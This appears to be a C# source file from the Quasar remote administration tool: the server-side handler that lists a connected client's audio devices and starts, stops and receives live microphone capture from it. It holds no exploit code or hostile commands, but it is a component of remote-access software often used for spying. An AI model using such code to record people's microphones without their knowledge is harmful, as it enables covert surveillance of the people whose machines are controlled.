using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote microphone.
    /// </summary>
    public class RemoteMicrophoneHandler : MessageProcessorBase<byte[]>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming audio.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// The current audio sample rate.
        /// </summary>
        public int SampleRate { get; private set; }

        /// <summary>
        /// The current number of audio channels.
        /// </summary>
        public int Channels { get; private set; }

        /// <summary>
        /// The current bits per sample.
        /// </summary>
        public int BitsPerSample { get; private set; }

        /// <summary>
        /// Used in lock statements to synchronize access between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Represents the method that will handle audio device changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="deviceNames">All currently available audio input devices.</param>
        public delegate void AudioDevicesChangedEventHandler(object sender, string[] deviceNames);

        /// <summary>
        /// Raised when the list of audio devices has been received.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event AudioDevicesChangedEventHandler AudioDevicesChanged;

        /// <summary>
        /// Reports changed audio devices.
        /// </summary>
        /// <param name="deviceNames">All currently available audio input devices.</param>
        private void OnAudioDevicesChanged(string[] deviceNames)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = AudioDevicesChanged;
                handler?.Invoke(this, (string[])val);
            }, deviceNames);
        }

        /// <summary>
        /// The client which is associated with this remote microphone handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteMicrophoneHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public RemoteMicrophoneHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetAudioDevicesResponse ||
                                                              message is GetAudioCaptureResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetAudioDevicesResponse d:
                    Execute(sender, d);
                    break;
                case GetAudioCaptureResponse a:
                    Execute(sender, a);
                    break;
            }
        }

        /// <summary>
        /// Begins receiving audio from the client using the specified device and quality settings.
        /// </summary>
        /// <param name="deviceIndex">The audio input device index.</param>
        /// <param name="sampleRate">The sample rate (e.g. 8000, 16000, 44100).</param>
        /// <param name="channels">The number of channels (1=mono, 2=stereo).</param>
        /// <param name="bitsPerSample">The bits per sample (typically 16).</param>
        public void BeginReceiveAudio(int deviceIndex, int sampleRate, int channels, int bitsPerSample)
        {
            lock (_syncLock)
            {
                IsStarted = true;
                SampleRate = sampleRate;
                Channels = channels;
                BitsPerSample = bitsPerSample;
                _client.Send(new GetAudioCapture
                {
                    CreateNew = true,
                    DeviceIndex = deviceIndex,
                    SampleRate = sampleRate,
                    Channels = channels,
                    BitsPerSample = bitsPerSample
                });
            }
        }

        /// <summary>
        /// Ends receiving audio from the client.
        /// </summary>
        public void EndReceiveAudio()
        {
            lock (_syncLock)
            {
                IsStarted = false;
                _client.Send(new DoAudioCaptureStop());
            }
        }

        /// <summary>
        /// Refreshes the available audio devices of the client.
        /// </summary>
        public void RefreshAudioDevices()
        {
            _client.Send(new GetAudioDevices());
        }

        private void Execute(ISender client, GetAudioDevicesResponse message)
        {
            OnAudioDevicesChanged(message.DeviceNames ?? new string[0]);
        }

        private void Execute(ISender client, GetAudioCaptureResponse message)
        {
            lock (_syncLock)
            {
                if (!IsStarted)
                    return;

                if (message.Audio != null && message.Audio.Length > 0)
                {
                    SampleRate = message.SampleRate;
                    Channels = message.Channels;
                    BitsPerSample = message.BitsPerSample;

                    OnReport(message.Audio);
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    IsStarted = false;
                }
            }
        }
    }
}
